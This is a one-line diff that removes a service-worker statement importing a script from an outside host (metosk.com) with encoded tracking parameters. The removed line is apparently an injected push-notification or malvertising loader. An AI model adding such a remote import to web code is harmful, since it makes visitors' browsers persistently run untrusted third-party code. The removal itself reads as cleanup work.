@@ -1,1 +1,0 @@
-importScripts('https://metosk.com/v1/sw-import.js?h=waWQiOjEwMTQ4NzYsInNpZCI6MTAxOTM0MCwid2lkIjo4ODc3NCwic3JjIjoyLCJwbSI6MH0=eyJ&d=attorneyx.ga');
